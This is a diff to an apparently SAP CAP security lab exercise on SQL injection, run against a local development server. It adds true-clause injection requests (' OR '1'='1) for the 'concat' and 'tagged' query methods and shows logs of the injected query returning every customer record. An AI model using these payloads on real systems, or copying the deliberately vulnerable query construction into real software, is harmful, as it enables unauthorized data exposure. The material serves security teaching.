@@ -118,7 +118,7 @@ module.exports = { ProcessorService, AdminService }
 
 **Why this is vulnerable:**
 - ❌ **No Input Validation:** The user-supplied customerID is concatenated directly into the SQL query without validation, making it possible for an attacker to inject malicious SQL code.
-- ❌ **Lack of Parameterized Queries:** The raw SQL query does not use parameter binding or prepared statements, leaving the query structure exposed to manipulation.
+❌ **Parenthesized tagged template method:** This approach is also vulnerable because parentheses force immediate evaluation of the template literal into a raw string before it reaches the tag/SQL builder—effectively making it behave like string concatenation and enabling injection.
 
 ## 💥 3. Exploitation
 
@@ -127,44 +127,47 @@ We will exploit the SQL Injection vulnerability in a local development environme
 ### 🪜 Step 1: Review the Test File for the HTTP Endpoint
 - ▶️ Action:
   - Navigate to the `test/http` directory in your CAP project folder.
-  - Open the file "sql-injection-demo.http".
+  - Open the file "fetchCustomer-sqlinject-exploit.http".
   
 ```
-@server=http://localhost:4004
-@username=incident.support@tester.sap.com // admin role
-@password=initial
+@server = http://localhost:4004
+@username = incident.support@tester.sap.com
+@password = initial
 
-### ✅ Test 1: Legitimate Customer Lookup
-### Action: Normal request with valid customer ID
-### Expected: Returns single customer record
-### Result: System returns data for customer ID 1004100
-GET {{server}}/odata/v4/admin/fetchCustomer
-Content-Type: application/json
+### SQL INJECTION EXPLOIT — Exercise 2
+# =====================================================
+# Methods implemented in services.js:
+#   - concat  → ❌ vulnerable: interpolates customerID into SQL string
+#   - tagged  → ❌ vulnerable: (parenthesized tagged template) helper returns raw SQL string (still injectable)
+# =====================================================
+
+
+### ============================================
+### PART A — VULNERABLE (method=concat)
+### ============================================
+
+### ✅ Test A1: Legitimate Request (concat) → expect 1 row
+GET {{server}}/odata/v4/admin/fetchCustomer(customerID='1004100',method='concat')
 Authorization: Basic {{username}}:{{password}}
 
-{
-  "customerID": "1004100"
-}
-  
-### 🚨 Test 2: SQL Injection True-Clause Attack
-### Action: Inject malicious payload ' OR '1'='1
+### 🚨 Test A2: True-clause injection (concat)
+### Action: Inject malicious payload ' OR '1'='1 (always true)
 ### Expected: Returns ALL customer records
 ### Result: Full database exposure vulnerability
-GET {{server}}/odata/v4/admin/fetchCustomer
-Content-Type: application/json
+GET {{server}}/odata/v4/admin/fetchCustomer(customerID='1004100'' OR ''1''=''1',method='concat')
 Authorization: Basic {{username}}:{{password}}
 
-{
-  "customerID": "1004100' OR '1'='1"
-}
 ... other method
+
+### 🚨 Test B2: True-clause injection (tagged) → may return many/all rows
+GET {{server}}/odata/v4/admin/fetchCustomer(customerID='1004100'' OR ''1''=''1',method='tagged')
+Authorization: Basic {{username}}:{{password}}
 
 ``` 
   
 - This file contains three HTTP requests:
-  - Test 1: A legitimate request to retrieve a specific customer.
-  - Test 2: A malicious request that demonstrates a SQL Injection vulnerability.
-  - Test 3: A SQL Injection using multiple SQL statements.
+  - Test A1: A legitimate request to retrieve a specific customer.
+  - Test A2, Test B2 : A malicious request that demonstrates a SQL Injection vulnerability with methods 'concat' and tagged.
 
 ### 🪜 Step 2: Exploit the SQL Injection Vulnerability
 - ▶️ Action:
@@ -177,83 +180,52 @@ Authorization: Basic {{username}}:{{password}}
   cds watch
 ```
 - Action:
-  - Open the `sql-injection-demo.http` file in your editor.
+  - Open the `fetchCustomer-sqlinject-exploit.http` file in your editor.
   - Confirm in your `package.json` file that the user `incident.support@tester.sap.com` is assigned the `admin` role under the `cds.requires.[development].auth.users` configuration.
-  - In `sql-injection-demo.http`, navigate to Test 2 to look up customer information and click on Send Request (added by the editor in the line above the GET statement).
+  - In `fetchCustomer-sqlinject-exploit.http`,, navigate to Test A2: True-clause injection (concat) to look up customer information and click on Send Request below line 25.
   
 ``` 
-  ### 🚨 Test 2: SQL Injection True-Clause Attack
-  ### Action: Inject malicious payload ' OR '1'='1
-  ### Expected: Returns ALL customer records
-  ### Result: Full database exposure vulnerability
-  GET {{server}}/odata/v4/admin/fetchCustomer
-  Content-Type: application/json
-  Authorization: Basic {{username}}:{{password}}
-  {
-    "customerID": "1004100' OR '1'='1"
-  }
+### 🚨 Test A2: True-clause injection (concat)
+### Action: Inject malicious payload ' OR '1'='1 (always true)
+### Expected: Returns ALL customer records
+### Result: Full database exposure vulnerability
+GET {{server}}/odata/v4/admin/fetchCustomer(customerID='1004100'' OR ''1''=''1',method='concat')
+Authorization: Basic {{username}}:{{password}}
+
 ```
-- Result:
+✅ Result:
 
 ``` 
-  HTTP/1.1 200 OK
-  X-Powered-By: Express
-  X-Correlation-ID: 06576897-f3fa-4d90-ab7c-bd175dd21abf
-  OData-Version: 4.0
-  Content-Type: application/json; charset=utf-8
-  Content-Length: 950
-  Date: Sun, 28 Sep 2025 19:02:26 GMT
-  Connection: close
-  
-  {
-    "@odata.context": "$metadata#Customers",
-    "value": [
-      {
-        "createdAt": "2025-09-28T19:02:19.936Z",
-        "createdBy": "anonymous",
-        "modifiedAt": "2025-09-28T19:02:19.936Z",
-        "modifiedBy": "anonymous",
-        "ID": "1004155",
-        "firstName": "Daniel",
-        "lastName": "Watts",
-        "name": "Daniel Watts",
-        "email": "daniel.watts@demo.com",
-        "phone": "+39-555-123",
-        "creditCardNo": "4111111111111111"
-      },
-      {
-        "createdAt": "2025-09-28T19:02:19.936Z",
-        "createdBy": "anonymous",
-        "modifiedAt": "2025-09-28T19:02:19.936Z",
-        "modifiedBy": "anonymous",
-        "ID": "1004161",
-        "firstName": "Stormy",
-        "lastName": "Weathers",
-        "name": "Stormy Weathers",
-        "email": "stormy.weathers@demo.com",
-        "phone": "+49-020-022",
-        "creditCardNo": "5500000000000004"
-      },
-      {
-        "createdAt": "2025-09-28T19:02:19.936Z",
-        "createdBy": "anonymous",
-        "modifiedAt": "2025-09-28T19:02:19.936Z",
-        "modifiedBy": "anonymous",
-        "ID": "1004100",
-        "firstName": "Sunny",
-        "lastName": "Sunshine",
-        "name": "Sunny Sunshine",
-        "email": "sunny.sunshine@demo.com",
-        "phone": "+49-555-789",
-        "creditCardNo": "3400000000000094"
-      }
-    ]
-  }  
+[odata] - GET /odata/v4/admin/fetchCustomer(customerID='1004100'' OR ''1''=''1',method='concat') 
+⚠️ Using INSECURE string concatenation method.
+❌ Vulnerable query constructed: SELECT * FROM sap_capire_incidents_Customers WHERE ID = '1004100' OR '1'='1'
+✅ Results count: 3
 
 ``` 
 
 ✅ Exploitation Successful: The application returned the entire contents of the Customers table instead of just the record for customer ID 1004100.
 
+▶️ Action: Navigate to Test B2: True-clause injection (tagged) to look up customer information and click on Send Request below line 39.
+
+```
+### 🚨 Test B2: True-clause injection (tagged) → may return many/all rows
+GET {{server}}/odata/v4/admin/fetchCustomer(customerID='1004100'' OR ''1''=''1',method='tagged')
+Authorization: Basic {{username}}:{{password}}
+```
+✅ Result:
+
+```
+[odata] - GET /odata/v4/admin/fetchCustomer(customerID='1004100'' OR ''1''=''1',method='tagged') 
+⚠️ Using INSECURE parenthesized tagged template method.
+❌ PARENTHESES DETECTED: strings is plain string, not array!
+❌ Vulnerable query constructed: SELECT * FROM sap_capire_incidents_Customers WHERE ID = '1004100' OR '1'='1'
+✅ Results count: 3
+
+```
+✅ Exploitation successful:
+
+- Same vulnerability as concat method: ALL customer records returned.
+- Parentheses cause immediate template evaluation, defeating the intended parameterization protection.
     
 ### 📌Critical Vulnerability Summary
 - ❌ **Complete Data Breach:** Any authenticated user can extract the entire contents of the customer table.
